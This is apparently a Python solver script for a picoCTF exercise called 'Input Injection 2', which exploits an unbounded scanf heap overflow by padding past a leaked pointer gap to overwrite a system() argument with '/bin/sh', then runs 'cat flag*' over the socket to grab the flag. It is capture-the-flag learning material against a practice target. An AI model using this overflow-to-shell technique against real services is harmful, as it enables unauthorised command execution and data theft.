#!/usr/bin/env python3
"""picoCTF - Input Injection 2 solver.

Heap overflow: scanf("%s", username) reads unbounded input into a 28-byte
heap buffer. The `shell` buffer ("/bin/pwd") lives in the next heap chunk and
is passed to system(). Overflow username to overwrite shell with "/bin/sh".

Key trick: the program leaks both heap pointers, so compute the padding
dynamically instead of hardcoding glibc chunk math.
"""
import re
import socket
import time

HOST, PORT = "amiable-citadel.picoctf.net", 52737


def rd(s):
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except (socket.timeout, ConnectionAbortedError, ConnectionResetError):
        pass
    return data


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(5)

    banner = rd(s).decode(errors="replace")
    print(banner)

    # Parse leaked pointers: "username at 0x..." / "shell at 0x..."
    user_ptr = int(re.search(r"username at (0x[0-9a-f]+)", banner).group(1), 16)
    shell_ptr = int(re.search(r"shell at (0x[0-9a-f]+)", banner).group(1), 16)
    pad = shell_ptr - user_ptr
    print(f"[*] padding = {pad} bytes")

    # %s stops at whitespace -> payload must be space-free; /bin/sh it is.
    s.sendall(b"A" * pad + b"/bin/sh\n")
    time.sleep(0.5)
    rd(s)

    s.sendall(b"cat flag*\n")
    time.sleep(1)
    out = rd(s).decode(errors="replace")
    print(out)

    flag = re.search(r"picoCTF\{[^}]+\}", out)
    if flag:
        print(f"[+] FLAG: {flag.group(0)}")
    s.close()


if __name__ == "__main__":
    main()
